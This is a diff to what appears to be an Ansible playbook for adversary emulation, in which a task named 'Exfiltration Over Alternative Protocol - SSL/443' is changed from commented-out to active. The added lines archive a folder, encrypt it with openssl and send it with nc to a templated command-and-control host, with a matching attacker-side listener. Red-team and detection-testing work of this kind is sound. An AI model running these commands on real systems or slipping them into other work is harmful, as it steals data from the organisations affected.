@@ -19,8 +19,8 @@
     - name: Exfiltration Over Alternative Protocol - SSL/443
       shell: |
         echo skipping
-        #tar czpf - {{ exfiltration_folder }}/* | openssl aes-256-cbc -salt -k {{ password_encryption }} | nc -w1 {{ exfil_fqdn }} {{ exfil_port }}
-        #attacker: nc -lp {{ exfil_port }} | openssl aes-256-cbc -d -k $pass {{ password_encryption }} > {{ exfiltration_file }}-ssl.tar.gz.enc
+        tar czpf - {{ exfiltration_folder }}/* | openssl aes-256-cbc -salt -k {{ password_encryption }} | nc -w1 {{ exfil_cnc }} {{ exfil_port }}
+        attacker: nc -lp {{ exfil_port }} | openssl aes-256-cbc -d -k $pass {{ password_encryption }} > {{ exfiltration_file }}-ssl.tar.gz.enc
     - name: Create Archive File
       archive:
         path: "{{ exfiltration_folder }}/*"
